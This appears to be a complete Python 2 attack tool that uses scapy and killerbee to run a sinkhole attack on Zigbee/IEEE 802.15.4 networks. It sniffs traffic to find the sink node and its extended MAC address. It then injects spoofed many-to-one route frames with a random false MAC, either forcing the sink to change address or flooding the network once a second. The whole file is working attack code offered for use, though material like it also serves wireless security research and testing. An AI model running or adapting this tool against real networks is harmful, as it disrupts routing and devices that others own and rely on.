import time
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from base64 import b64decode
import random
import argparse
from scapy.all import (Dot15d4,
                       ZigbeeNWK,
                       ZigbeeNWKCommandPayload,
                       Dot15d4Data,
                       wrpcap,
                       LinkStatusEntry,
                       rdpcap)
from killerbee import scapy_extensions as zcapy


def SinkHole(sink_node, ext_sink_addr, netchannel, netid):

    false_mac = random.getrandbits(64)
    new_sink_addr = 0
    with open("many2one.dat", "rb") as file_descriptor:
        frame_bytes = b64decode(file_descriptor.read())
        many2one_frame = Dot15d4(frame_bytes)

    many2one_frame["Dot15d4Data"].src_addr = sink_node
    many2one_frame["Dot15d4Data"].dest_panid = netid
    many2one_frame["ZigbeeNWK"].seqnum = random.randint(1, 255)
    many2one_frame["ZigbeeNWK"].source = sink_node
    many2one_frame["ZigbeeNWK"].ext_src = false_mac

    if sink_node != 0x0:
        print "[->]Forcing to change sink node address"
        zcapy.kbsendp(pkt=many2one_frame,
                      channel=netchannel,
                      verbose=0,
                      count=1)

        while True:
            pkt = zcapy.kbsniff(channel=netchannel,
                                count=1,
                                lfilter=pkt_filter("NWK"),
                                verbose=0)

            if pkt[0]["ZigbeeNWK"].ext_src == ext_sink_addr:
                new_sink_addr = pkt[0]["ZigbeeNWK"].source
                break
            elif pkt[0]["ZigbeeNWK"].ext_dst == ext_sink_addr:
                new_sink_addr = pkt[0]["ZigbeeNWK"].destination
                break

        print "[!!]Sink node changed net address to {:x}".format(new_sink_addr)

    else:
        print("[!!]Sink node is also coordinator..."
              "sending periodical m2one pkts with false MAC")
        while True:
            many2one_frame["ZigbeeNWK"].seqnum = random.randint(1, 255)
            zcapy.kbsendp(pkt=many2one_frame,
                          channel=netchannel,
                          verbose=0,
                          count=1)
            time.sleep(1)


def pkt_filter(pfilter):

    if pfilter == "NWK":
        return lambda pkt: pkt.haslayer("ZigbeeNWK")
    elif pfilter == "ZCL":
        return lambda pkt: pkt.haslayer("ZigbeeClusterLibrary")


def sink_node_search(netchannel, search_time):

    dest_address_dict = {}
    time_counter = 0
    pcounter = 0
    while True:
        init_time = time.time()
        pkt = zcapy.kbsniff(channel=netchannel,
                            count=1,
                            verbose=0,
                            lfilter=pkt_filter("NWK"))

        destination_address = pkt[0]["ZigbeeNWK"].destination
        if destination_address not in dest_address_dict:
            dest_address_dict[destination_address] = 1
        else:
            dest_address_dict[destination_address] += 1

        pcounter += 1
        final_time = time.time()
        time_counter += round(final_time - init_time)
        if time_counter >= search_time:
            break

    print "-"*17
    print "|Address|Pkts\t|"
    print "-"*17
    for daddr, pkt_count in dest_address_dict.items():
        if daddr == 0:
            daddr = "0x0000"
        else:
            daddr = hex(daddr)
        print "|{:s}\t| {:d}\t|".format(daddr, pkt_count)
    print "-"*17
    print "  Total Pkts:{:d}\n".format(pcounter)


def GetLongMac(selected_sink, netchannel):

    while True:
        pkt = zcapy.kbsniff(channel=netchannel,
                            verbose=0,
                            lfilter=pkt_filter('NWK'),
                            count=1)
        if pkt[0]['ZigbeeNWK'].source == selected_sink:
            long_mac = pkt[0]['ZigbeeNWK'].ext_src
            if long_mac > 0:
                return long_mac
        elif pkt[0]['ZigbeeNWK'].destination == selected_sink:
            long_mac = pkt[0]['ZigbeeNWK'].ext_dst
            if long_mac > 0:
                return long_mac


def main():

    cli_args = argparse.ArgumentParser(description="Execute sinkhole attack on"
                                                   "IEEE 802.15.4 Networks")
    args_group = cli_args.add_mutually_exclusive_group()
    cli_args.add_argument("netchannel",
                          type=int,
                          help="network operative channel")
    args_group.add_argument("--sink_addr",
                            "-a",
                            default=0,
                            help="Sink node address")
    args_group.add_argument("--scann_time",
                            "-t",
                            type=int,
                            default=0,
                            help="Search sink node time")
    cli_args.add_argument("panid", help="Network PAIND")
    input_args = cli_args.parse_args()

    netid = int(input_args.panid, 16)
    netchannel = input_args.netchannel

    try:
        if input_args.sink_addr:
            sink_node = int(input_args.sink_addr, 16)
        elif input_args.scann_time:
            search_time = int(input_args.scann_time)
            print "[!!]Sink node address not specified!"
            print "[**]Scaning network and collecting packets...\n"
            sink_node_search(netchannel, search_time)
            sink_node = int(raw_input("[!!]Enter sink node address:"), 16)
        else:
            print "[!!] Not target specified.. exiting.."
            sys.exit(1)
    except ValueError as error:
        print "[!!]Unexpected value: {:s}".format(error)
        sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(0)

    print "[**]Searching for extended address from {:d}".format(sink_node)
    ext_sink_addr = GetLongMac(sink_node, netchannel)
    print "[OK]Extended address for {:d} found at {:x}".format(sink_node,
                                                               ext_sink_addr)
    SinkHole(sink_node, ext_sink_addr, netchannel, netid)


if __name__ == "__main__":
    main()
